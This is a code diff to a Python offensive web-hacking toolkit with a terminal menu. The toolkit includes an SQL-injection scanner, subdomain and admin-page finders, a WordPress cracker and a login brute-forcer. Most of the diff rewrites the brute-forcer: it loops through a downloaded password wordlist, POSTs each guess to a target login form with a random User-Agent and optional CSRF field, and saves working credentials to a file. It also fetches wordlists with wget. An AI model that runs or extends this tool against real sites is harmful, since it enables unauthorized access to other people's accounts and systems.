@@ -100,8 +100,8 @@ if not os.path.exists("./src/brute/successMessage.txt"):
 if not os.path.exists("./src/brute/users.txt"):
     os.system("wget -O ./src/brute/users.txt https://raw.githubusercontent.com/SansXpl/src/main/users.txt")
 
-if not os.path.exists("./src/brute/passwords.txt"):
-    os.system("wget -O ./src/brute/passwords.txt https://raw.githubusercontent.com/SansXpl/src/main/passwords.txt")
+if not os.path.exists("./src/passwords.txt"):
+    os.system("wget -O ./src/passwords.txt https://raw.githubusercontent.com/SansXpl/src/main/passwords.txt")
 
 if not os.path.exists("./output/crawler"):
     os.makedirs("./output/crawler")
@@ -313,16 +313,6 @@ else:
 time.sleep(0.750)
 
 #Public =====================================
-def open_ressources(file_path):
-  return [item.replace("\n", "") for item in open(file_path).readlines()]
-
-
-INCORRECT_MESSAGE = open_ressources('./src/brute/incorrectMessage.txt')
-SUCCESS_MESSAGE = open_ressources('./src/brute/successMessage.txt')
-PASSWORDS = open_ressources('./src/brute/passwords.txt')
-USERS = open_ressources('./src/brute/users.txt')
-LIMIT_TRYING_ACCESSING_URL = 7
-
 os.system(clrcmd)
 banner = f"""\033[38;5;208m
      │_________________________
@@ -556,8 +546,8 @@ class sqlscan():
 Url: {scan}
 Error: {err}\n\n"""
                 save_file(name, content, 1)
+                main()
                 break
-                pass
               else:
                 dq = 1
               time.sleep(0.02)
@@ -582,12 +572,11 @@ Error: {err}\n\n"""
 Url: {scan}
 Error: {err}\n\n"""
                   save_file(name, content, 1)
+                  main()
                   break
-                  pass
                 else:
                   sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                   input("")
-                  pass
                 time.sleep(0.02)
 
           except Exception as e:
@@ -601,7 +590,6 @@ Error: {err}\n\n"""
           sys.stdout.write(f"\r{whitespace}")
           sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
           input("")
-          pass
         main()
 
       elif (mode == 2):
@@ -734,7 +722,7 @@ Error: {err}\n\n"""
 #Subdomain Scanner =====================================
 class SUB():
 
-  def request(url):
+  def request(self,url):
     try:
       return requests.get("http://" + url)
     except requests.exceptions.ConnectionError:
@@ -755,11 +743,12 @@ class SUB():
         if "http://" in s_url or "https://" in s_url:
           n_url = urlparse(s_url).hostname
           s_url = n_url
+          s_url = str(s_url)
         else:
           n_url = s_url
           s_url = s_url
         
-        checkConnection(s_url,1)
+        checkConnection("http://"+n_url,1)
 
         try:
           subdomains = []
@@ -1344,7 +1333,7 @@ class crawler():
           print(f" ├─[{PINK}e.g: https://www.google.com{W}]")
           print(f"{W} │")
           s_url = str(
-            input(f" └─[{BO}Url{P}] "))
+            input(f" └─[{BO}Url{W}]{P} "))
           if "http://" in s_url or "https://" in s_url:
             s_url = s_url
             n_url = urlparse(s_url).hostname
@@ -1353,7 +1342,7 @@ class crawler():
             s_url = "http://" + s_url
         
           try:
-            checkConnection(s_url,1)
+            checkConnection("http://"+n_url,1)
           except:
             main()
           print(f"\n{loading}{BO} Crawling Site...")
@@ -1440,7 +1429,7 @@ class crawler():
               s_url = "http://" + s_url
 
             try:
-              checkConnection(s_url,0)
+              checkConnection("http://"+n_url,0)
             except:
               main()
             print(f"\n{loading}{BO} Crawling Site...")
@@ -1527,7 +1516,7 @@ class ADMF():
           n_url = s_url
           s_url = "http://" + s_url
         
-        checkConnection(s_url,1)
+        checkConnection("http://"+n_url,1)
 
         with open('./src/adminpages.txt', 'r') as f:
           adminpages = f.read().splitlines()
@@ -1582,206 +1571,175 @@ class ADMF():
 
 
 #Login Brute =====================================
+def open_ressources(file_path):
+  return [item.replace("\n", "") for item in open(file_path).readlines()]
+
+
+INCORRECT_MESSAGE = open_ressources('./src/brute/incorrectMessage.txt')
+SUCCESS_MESSAGE = open_ressources('./src/brute/successMessage.txt')
+PASSWORDS = open_ressources('./src/passwords.txt')
+USERS = open_ressources('./src/brute/users.txt')
+LIMIT_TRYING_ACCESSING_URL = 7
+
 class LOG():
-
-  def process_request(self, request, user, password, failed_aftertry, url):
-    filetemp = str(uuid.uuid4())
-    if "http://" in url or "https://" in url:
-      n_url = urlparse(url).hostname
-    else:
-      n_url = url
-
-    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
-      if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
-        print(f"\n{fail}{BR} Connection failed : Trying again ....")
-        return
-      else:
-        failed_aftertry = failed_aftertry + 1
-        print(f"\n{fail}{BR} Connection failed : 404 Not Found (Verify your url)")
-    else:
-
-      #print data.text
-      if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[
-          1] in request.text:
-        print(f"\n{fail}{BR} Failed to connect with:\n{BO}User: {P}{user}\n{BO}Pass: {P}{password}")
-      else:
-        if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[
-            1] in request.text:
-
-          sys.stdout.write("\r" + whitespace)
-          sys.stdout.write(f"\r{found}{BG}Url: {url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")
-
-          text = "Url: {}\nUsername: {}\nPassword: {}\n".format(
-            url, user, password)
-          temp = open("./.temp/" + filetemp, "a+")
-          temp.writelines(text)
-          temp.close()
-
-          if os.path.exists("./.temp/" + filetemp):
-            removeDups(filetemp)
-            c = open("./.temp/" + filetemp, "r")
-            name = "./output/logbrute/" + n_url + ".txt"
-            content = c.read()
-            c.close()
-            os.remove("./.temp/" + filetemp)
-            save_file(name, content, 1)
-          else:
-            input(f"\n{fail}{BO} Nothing is Saved!")
-            main()
-          main()
-        else:
-          sys.stdout.write("\r" + whitespace)
-          sys.stdout.write(f"\r{loading}{BB} Trying theese parameters:\n{BO}User: {P}{user}\n{BO}Pass: {P}{password}")
-
-  def get_csrf_token(self, url, csrf_field):
-    time_stamp = time.time()
-    date_time = datetime.fromtimestamp(time_stamp)
-    str_date_time = date_time.strftime(W+"["+BO+"%H:%M:%S"+W+"]")
-    result = requests.get(url)
-    tree = html.fromstring(result.text)
-    sys.stdout.write("\r" + whitespace)
-    sys.stdout.write(f"\r{rstr_date_time}{O} Trying to Fetch a token...")
-    _token = ""
-    try:
-      _token = list(
-        set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
-    except Exception as es:
-      pass
-    return _token
-
-  def process_user(self, user,
-                   url,
-                   failed_aftertry,
-                   user_field,
-                   password_field,
-                   csrf_field="_csrf"):
-    for password in PASSWORDS:
-      payload = {
-        user_field: user.replace('\n', ''),
-        password_field: password.replace('\n', ''),
-        csrf_field: self.get_csrf_token(url, csrf_field)
-      }
-    print(success + BG, payload)
-    request = requests.post(url, data=payload)
-    self.process_request(request, user, password, failed_aftertry, url)
-
-  def try_connection(self, url, user_field, password_field, csrf_field):
-    print(f"{success}{G} Connecting to: {P}{url}\n")
-    failed_aftertry = 0
-    for user in USERS:
-      self.process_user(user, url, failed_aftertry, user_field, password_field,
-                       csrf_field)
-
-  def manual_mode(self, ):
-    print(f"{success}{BO} After inspecting the LOGIN <form/>, please fill here :{W}")
-    print(f" ├─[{PINK}Target <'action'> attribute | e.g: http://site.com/login-form.php{W}]")
-    print(f" ├─[{PINK}User Field <'name'> attribute | e.g: username{W}]")
-    print(f" ├─[{PINK}Password Field <'name'> attribute | e.g: password{W}]")
-    print(f" ├─[{PINK}CSRF Token <'name'> attribute | leave blank if this not showed{W}]")
-    print(f"{W} │")
-    url = str(
-      input(f"{W} ├─[{BO}Target Url{W}]{P} "))
-    if "http" in url or "/" in url or "." in url:
-      pass
-    else:
-      input(invalid)
-      self.main()
-    user_field = str(
-      input(f"{W} ├─[{BO}User Field{W}]{P} "))
-    password_field = str(
-      input(f"{W} ├─[{BO}Password Field{W}]{P} "))
-    csrf_field = str(input(f"{W} └─[{BO}csrf-token{W}]{P} "))
-
-    checkConnection(url,1)
-
-    self.try_connection(url, user_field, password_field, csrf_field)
-
-  def extract_field_form(self, url, html_contain):
-    print(f"{printout}{O} Starting extraction...")
-    tree = html.fromstring(html_contain)
-
-    print(f"{printout}{O} Fetching parameters..")
-    form_action_url = list(tree.xpath("//form/@action"))[0]
-    payload_fetched = list(set(tree.xpath("//form//input")))
-    if len(form_action_url) == 0:
-      form_action_url = url
-
-    if "http" not in form_action_url:
-      form_action_url = url + form_action_url
-
-    print(success + B + " Action : ", form_action_url)
-    fields = []
-    for each_element in payload_fetched:
-      names = each_element.xpath("//@name")
-      types = each_element.xpath("//@type")
-
-      for i, name in enumerate(names):
-        if types[i] != "submit" and name != "submit":
-          print(success + B + " ~>", str(name),
-                "{" + str(types[i]) + "}")
-
-        fields = names
-        break
-
-    if len(fields) == 2:
-      fields.append("empty-token-field")
-
-    self.try_connection(url, fields[0], fields[1], fields[2])
-
-  def automatic_mode(self):
-    print(f" ├─[{PINK}e.g: http://site.com/login/{W}]")
-    print(f"{W} │")
-    url = str(
-      input(f"{W} └─[{BO}Url{W}]{P} "))
-
-    checkConnection(url,1)
-
-    if "http" in url or "/" in url or "." in url:
-      r = requests.get(url)
-    else:
-      input(invalid)
-      self.main()
-      
-
-    self.extract_field_form(url, r.text)
 
   def main(self):
     try:
-      mode_banner = f"""{W}[{BR}@{W}]{BG} Login Brute {W}
- ╿
- ├┬─[{BR}1{W}]{BO} Auto Mode {W}
- │├─[{BR}2{W}]{BO} Manual Mode {W}
- │└─[{BR}3{W}]{BO} Back {W}
- │"""
+      csrf = 0
       os.system(clrcmd)
       print(banner)
-      print(mode_banner)
+      print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
+      print(f" ├─[{PINK}Target e.g: http://site.com/login/{W}]")
+      print(f" ├─[{PINK}Add -csrf = enable csrf-token]")
+      print(f"{W} │")
+      _input = input(f" └─[{BO}~>{W}]{P} ")
+      _input = _input.replace(" ", "" )
 
-      mode = input(f" └─[{BR}~>{W}]{P} ")
-      if (mode == '1' or mode == '01'):
-        self.func(1, "Auto Mode")
-      elif (mode == '2' or mode == '02'):
-        self.func(2, "Manual Mode")
-      elif (mode == '0' or mode == '00'):
-        main()
+      if "-csrf" in _input:
+        _input = _input.replace("-csrf", "" )
+        target = _input
+        os.system(clrcmd)
+        print(banner)
+        print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
+        print(f"{W} ├─[{BO}Target{W}] {P}{target}")
+        user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
+        passwd = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
+        if passwd == "" or passwd == " ":
+          passwd = "./src/passwords.txt"
+        else:
+          if not os.path.isfile(passwd) and not os.access(passwd, os.R_OK):
+            input(f"{error}{BR} File Does Not Exists!")
+            self.main()
+          else:
+            passwd = passwd
+        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
+        password_field = str(input(f"{W} ├─[{BO}Pass Field{W}]{BB} "))
+        csrf_field = str(input(f"{W} └─[{BO}CSRF Token{W}]{BG} "))
+        csrf = 1
+
+        self.run(target, user, passwd, user_field, password_field, csrf_field, csrf)
+
       else:
-        input(invalid)
-        self.main()
+        target = _input
+        os.system(clrcmd)
+        print(banner)
+        print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
+        print(f"{W} ├─[{BO}Target{W}] {P}{target}")
+        user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
+        passwd = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
+        if passwd == "" or passwd == " ":
+          passwd = "./src/passwords.txt"
+        else:
+          if not os.path.isfile(passwd) and not os.access(passwd, os.R_OK):
+            input(f"{error}{BR} File Does Not Exists!")
+            self.main()
+          else:
+            passwd = passwd
+        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
+        password_field = str(input(f"{W} └─[{BO}Pass Field{W}]{BB} "))
+        csrf_field = "None"
+        csrf = 0
+
+        self.run(target, user, passwd, user_field, password_field, csrf_field, csrf)
 
     except KeyboardInterrupt:
       cancel()
-        
-  def func(self, slc, mode):
-    os.system(clrcmd)
-    print(banner)
-    print(f"{W}[{BR}@{W}]{BG} Login Brute {BG}[{mode}]{W}")
 
-    if slc == 1:
-      self.automatic_mode()
-    elif slc == 2:
-      self.manual_mode()
+  def blocks(self, files, size=65536):
+    while True:
+        b = files.read(size)
+        if not b: break
+        yield b
 
 
+  def run(self, url, user, passwd, user_field, password_field, csrf_field, csrf):
+    n_url = urlparse(url).hostname
+
+    if csrf == 1:
+      _csrf_token = O+csrf_field
+    else:
+      _csrf_token = W+csrf_field
+
+    passwd_size = os.path.getsize(passwd) >>20
+    if passwd_size < 100:
+      with open(passwd) as f:
+        totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
+    else:
+        totalwordlist="unknown"
+
+    print(f"\n{success}{BB} Target.......: {P}{url}")
+    print(f"{success}{BB} Username.....: {PINK}{user}")
+    print(f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)}{PINK} [{passwd}]")
+    print(f"{success}{BB} User Field...: {O}{user_field}")
+    print(f"{success}{BB} Pass Field...: {O}{password_field}")
+    print(f"{success}{BB} CSRF-Token...: {_csrf_token}{W}")
+
+    checkConnection(url,1)
+
+    count = 0
+    totalwordlist = str(totalwordlist)
+    term = Terminal()
+
+    listAgent= open("./src/UserAgent.txt", "r")
+    Agent = listAgent.read().splitlines()
+    Ua = random.choice(Agent)
+    header = {'User-Agent': Ua}
+
+    with open(passwd) as wordlist:
+        for pwd in wordlist:
+          count += 1
+          cnt = W+"["+BO+str(count)+'/'+totalwordlist+W+"]"
+
+          if csrf == 1:
+            payload = {user_field: user,password_field: pwd.replace('\n', ''),csrf_field: _csrf_token}
+
+          else:
+            payload = {user_field: user,password_field: pwd.replace('\n', '')}
+
+          req = requests.post(url, data=payload, headers=header)
+
+          with open("./src/Login_Success.txt", 'r') as f:
+            success_text = f.read().splitlines()
+
+          
+          if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
+            with term.location(x=0, y=26):
+                print(whitespace)
+            with term.location(x=0, y=28):
+                print(whitespace)
+            print(f"\n{found}{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{pwd}")
+
+            content = f"Url: {url}\nUsername: {user}\nPassword: {pwd}\n"
+            name = "./output/logbrute/" + n_url + ".txt"
+            save_file(name, content, 1)
+            main()
+            break
+
+          else:
+            with term.location(x=0, y=26):
+              try:
+                with term.location(x=0, y=26):
+                  print(whitespace)
+                with term.location(x=0, y=26):
+                  print(f"{success}{BB}Payload: {W}{payload}")
+                with term.location(x=0, y=28):
+                  print(whitespace)
+                with term.location(x=0, y=28):
+                  print(f"{cnt}{BO} User: {P}{user}{BO} Pass: {P}{pwd}")
+              except KeyboardInterrupt:   
+                with term.location(x=0, y=30):
+                  cancel()
+
+
+          sleep(0.150)
+          count = int(count)
+
+    with term.location(x=0, y=28):
+      print(whitespace)
+    with term.location(x=0, y=28):
+      print(f"\n{error}{BR} Password NOT found :(")
+      input("")
+      main()
 #MARKER #WordPress Crack =====================================
 class WP():
 
@@ -1927,7 +1885,7 @@ class WP():
       user = str(input(f"{W} ├─[{BO}Username{W}]{P} "))
       wlfile = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{P} "))
       if wlfile == "" or wlfile == " ":
-        wlfile = "./src/brute/passwords.txt"
+        wlfile = "./src/passwords.txt"
       else:
         if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
           input(f"{error}{BR} File Does Not Exists!")
@@ -2032,7 +1990,7 @@ class nslookup():
           url = f_url
           n_url = url
 
-        checkConnection("https://"+url,1)
+        checkConnection("http://"+n_url,1)
 
         for type in types:
           command = "nslookup -type=" + type + " " + url
@@ -2092,7 +2050,7 @@ class nslookup():
             url = f_url
             n_url = url
 
-          checkConnection("https://"+url,0)
+          checkConnection("http://"+n_url,0)
 
           for type in types:
             command = "nslookup -type=" + type + " " + url
@@ -2178,14 +2136,14 @@ class REVIP():
         if mode == 1:
           n_url = inp
           dom = inp
-          checkConnection("https://"+n_url,1)
+          checkConnection("http://"+n_url,1)
 
           self.reverseIPlookup(dom, n_url)
 
         elif mode == 2:
           ip = inp
           n_url = inp
-          checkConnection(ip,1)
+          checkConnection("http://"+ip,1)
           if ipCategorizer(ip):
             if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
                 if ipCategorizer(ip)[0] == 1:
@@ -2207,7 +2165,7 @@ class REVIP():
               n_url = ip
         
               ip = ip.decode('utf-8').rstrip()
-              checkConnection(ip,1)
+              checkConnection("http://"+ip,1)
               if ipCategorizer(ip):
                 if ipCategorizer(ip)[0] == 1 or ipCategorizer(ip)[0] == 3:
                     if ipCategorizer(ip)[0] == 1:
@@ -2470,3 +2428,66 @@ def exit():
 
 if __name__ == '__main__':                                          
   main()
+
+  '''
+   ├─[Target <'action'> attribute | e.g: http://site.com/login-form.php]
+ ├─[User Field <'name'> attribute | e.g: username]
+ ├─[Password Field <'name'> attribute | e.g: password]
+ ├─[CSRF Token <'name'> attribute | leave blank if this not showed]
+ │
+
+          elif "-a" in _input:
+          _input = _input.replace("-a", "" )
+
+          url = _input
+
+          if "http" in _input or "/" in _input or "." in _input:
+            r = requests.get(_input)
+
+          else:
+            input(invalid)
+            self.main()
+          
+          
+          self.extract_field_form(_input, r.text, csrf)
+
+
+          self, url, html_contain,
+
+          #=========================================================
+
+          print(f"{printout}{O} Starting extraction...")
+          tree = html.fromstring(html_contain)
+
+          print(f"{printout}{O} Fetching parameters..")
+          form_action_url = list(tree.xpath("//form/@action"))[0]
+          payload_fetched = list(set(tree.xpath("//form//input")))
+          if len(form_action_url) == 0:
+            form_action_url = url
+
+          if "http" not in form_action_url:
+            form_action_url = url +""+ form_action_url
+
+          print(success + B + " Action : ", form_action_url)
+          fields = []
+          for each_element in payload_fetched:
+            names = each_element.xpath("//@name")
+            types = each_element.xpath("//@type")
+
+            for i, name in enumerate(names):
+              if types[i] != "submit" and name != "submit":
+                print(success + B + " ~>", str(name),
+                      "{" + str(types[i]) + "}")
+
+              fields = names
+              break
+
+          if len(fields) == 2:
+            fields.append("empty-token-field")
+
+          
+
+          self.info(self, target, user, passwd, user_field, password_field, csrf_field, csrf)
+          
+          self.try_connection(url, fields[0], fields[1], fields[2], csrf)
+'''
